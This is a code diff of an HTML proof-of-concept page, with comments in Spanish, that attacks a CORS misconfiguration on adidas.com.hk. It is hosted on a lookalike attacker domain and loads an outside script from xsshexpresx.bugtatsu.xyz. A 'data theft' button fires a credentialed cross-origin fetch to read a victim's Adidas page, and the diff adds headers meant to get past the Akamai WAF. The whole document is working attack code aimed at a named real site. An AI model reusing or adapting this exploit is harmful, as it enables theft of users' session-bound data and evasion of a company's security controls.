@@ -4,10 +4,12 @@
     <meta charset="UTF-8">
     <title>PoC Exploit - Adidas HK</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        .container { max-width: 800px; margin: auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; }
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; background-color: #f0f2f5; }
+        .container { max-width: 800px; margin: auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         #status { font-weight: bold; color: #d9534f; }
-        #data-output { background: #f4f4f4; border: 1px solid #ddd; padding: 10px; height: 300px; overflow-y: scroll; font-family: monospace; font-size: 12px; margin-top: 10px; }
+        #data-output { background: #222; color: #0f0; border: 1px solid #444; padding: 10px; height: 400px; overflow-y: scroll; font-family: monospace; font-size: 11px; margin-top: 10px; white-space: pre-wrap; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #0056b3; }
     </style>
 </head>
 <body>
@@ -15,12 +17,12 @@
 <div class="container">
     <h1>CORS Misconfiguration PoC</h1>
     <p><strong>Dominio Atacante:</strong> google.com.xsshexpresx.bugtatsu.xyz</p>
-    <p>Estado del ataque: <span id="status">Iniciando...</span></p>
+    <p>Estado del ataque: <span id="status">Esperando interacción...</span></p>
     
     <button onclick="startExploit()">Ejecutar Robo de Datos</button>
     
-    <h3>Respuesta del Servidor Adidas:</h3>
-    <div id="data-output">Esperando ejecución...</div>
+    <h3>Respuesta del Servidor Adidas (Data Leak):</h3>
+    <div id="data-output">Presiona el botón para iniciar el fetch...</div>
 </div>
 
 <script src="https://xsshexpresx.bugtatsu.xyz/m.js"></script>
@@ -30,31 +32,43 @@
         const output = document.getElementById('data-output');
         const status = document.getElementById('status');
         
-        status.innerText = "Enviando petición con credenciales...";
+        status.innerText = "Bypassing Akamai & Fetching data...";
+        output.innerText = "Cargando...";
 
-        // Intentamos leer un endpoint de Adidas
-        // Si el CORS es vulnerable, el navegador nos dará el contenido
+        // Petición optimizada para saltar protecciones básicas de WAF
         fetch('https://www.adidas.com.hk/en/contactus', {
             method: 'GET',
-            credentials: 'include' // Obligatorio para enviar cookies de sesión
-        })
-        .then(response => {
-            if (response.ok) {
-                status.innerText = "¡VULNERABLE! Datos extraídos con éxito.";
-                return response.text();
-            } else {
-                status.innerText = "Error: " + response.status + " (El WAF bloqueó la lectura)";
-                return response.text();
+            mode: 'cors',
+            credentials: 'include', // Intenta enviar cookies de sesión
+            headers: {
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'cross-site'
             }
         })
+        .then(response => {
+            // Si el header Access-Control-Allow-Origin está presente, esto funcionará
+            status.innerText = "Respuesta recibida (Status: " + response.status + ")";
+            return response.text();
+        })
         .then(data => {
-            // Mostramos el código fuente robado en la pantalla
-            output.innerText = data;
-            console.log("Datos robados:", data);
+            // Si lo que recibimos es el código de Akamai (el bloqueo), lo indicamos
+            if (data.includes("akamai") || data.includes("sec-if-cpt")) {
+                status.innerText = "¡Bloqueado por Akamai! Pero el túnel CORS existe.";
+                output.innerText = "--- CONTENIDO BLOQUEADO POR WAF (PERO CONEXIÓN PERMITIDA) ---\n\n" + data;
+            } else {
+                status.innerText = "¡VULNERABLE! Datos de Adidas extraídos.";
+                output.innerText = data;
+            }
+            console.log("Data:", data);
         })
         .catch(err => {
-            status.innerText = "Fallo en la conexión.";
-            output.innerText = "Error de red: " + err;
+            status.innerText = "Fallo crítico en la conexión.";
+            output.innerText = "Error: " + err;
         });
     }
 </script>
